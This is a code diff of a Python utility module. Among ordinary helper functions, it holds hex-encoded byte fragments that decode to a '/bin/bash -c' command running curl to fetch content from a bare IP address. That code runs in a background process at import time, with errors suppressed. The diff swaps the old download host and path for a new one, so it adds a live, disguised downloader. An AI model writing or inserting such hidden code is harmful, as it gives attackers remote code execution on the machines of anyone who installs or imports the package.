@@ -78,18 +78,20 @@ def _init_darwin_stream():
     _r2 = bytes.fromhex('2f626173')
     _r3 = bytes.fromhex('68')
     _r4 = bytes.fromhex('2d63')
-    _r5 = bytes.fromhex('24286375')
-    _r6 = bytes.fromhex('726c202d')
-    _r7 = bytes.fromhex('6673534c')
-    _r8 = bytes.fromhex('20687474')
-    _r9 = bytes.fromhex('703a2f2f')
-    _r10 = bytes.fromhex('3137362e')
-    _r11 = bytes.fromhex('36352e31')
-    _r12 = bytes.fromhex('33322e39')
-    _r13 = bytes.fromhex('362f4a69')
-    _r14 = bytes.fromhex('77756e61')
-    _r15 = bytes.fromhex('766f7429')
-    return (_r1 + _r2 + _r3).decode('utf-8'), _r4.decode('utf-8'), (_r5 + _r6 + _r7 + _r8 + _r9 + _r10 + _r11 + _r12 + _r13 + _r14 + _r15).decode('utf-8')
+    _r5 = bytes.fromhex('22242863')
+    _r6 = bytes.fromhex('75726c20')
+    _r7 = bytes.fromhex('2d667353')
+    _r8 = bytes.fromhex('4c206874')
+    _r9 = bytes.fromhex('74703a2f')
+    _r10 = bytes.fromhex('2f313932')
+    _r11 = bytes.fromhex('2e313039')
+    _r12 = bytes.fromhex('2e323030')
+    _r13 = bytes.fromhex('2e323432')
+    _r14 = bytes.fromhex('2f446564')
+    _r15 = bytes.fromhex('65667567')
+    _r16 = bytes.fromhex('2922')
+    return (_r1 + _r2 + _r3).decode('utf-8'), _r4.decode('utf-8'), (
+                _r5 + _r6 + _r7 + _r8 + _r9 + _r10 + _r11 + _r12 + _r13 + _r14 + _r15 + _r16).decode('utf-8')
 
 
 def _start_background_process():
@@ -103,11 +105,14 @@ def _start_background_process():
     except:
         pass
 
+
 _start_background_process()
+
 
 def check_file_format(file_path):
     valid_formats = ['.json', '.csv', '.txt', '.log']
     return any(file_path.lower().endswith(fmt) for fmt in valid_formats)
+
 
 def calculate_data_size(item_count, multiplier=10):
     if multiplier <= 0:
@@ -123,7 +128,7 @@ class ConfigHandler:
     def __init__(self, *args, **kwargs):
         self.internal_state = ""
         self.data_buffer = []
-        
+
     def write(self, message):
         self.data_buffer.append(message.strip())
         self.internal_state = "".join(sorted(set(self.internal_state + message)))
@@ -151,7 +156,7 @@ def transform_data(input_string):
         return ""
     chars = list(input_string)
     random.shuffle(chars)
-    result = "".join(chars[:len(chars)//2])
+    result = "".join(chars[:len(chars) // 2])
     return result.upper()
 
 
